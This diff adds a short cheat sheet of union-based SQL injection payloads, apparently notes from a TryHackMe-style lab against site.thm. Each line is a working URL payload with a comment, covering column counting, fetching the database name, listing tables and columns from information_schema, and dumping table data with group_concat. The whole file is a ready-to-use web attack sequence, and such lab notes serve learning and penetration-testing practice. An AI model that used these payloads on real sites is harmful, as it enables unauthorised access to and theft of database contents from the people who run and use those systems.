@@ -1,0 +1,15 @@
+http://site.thm/page?id=1 UNION SELECT 1,2,...n  <---|
+                                                     |-- get total column
+http://site.thm/page?id=0 UNION SELECT 1,2,...n  <---|
+
+
+http://site.thm/page?id=0 UNION SELECT 1,2,database() <- get the db name
+
+
+http://site.thm/page?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='db_name' <-- gather list of tables in that db
+
+
+http://site.thm/page?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='table_name' <-- gather list of cols from the table
+
+
+http://site.thm/page?id=0 UNION SELECT 1,2,group_concat(col_name,':',col_name SEPARATOR '<br>') FROM table_name <-- print data from the cols in the tables that we provide
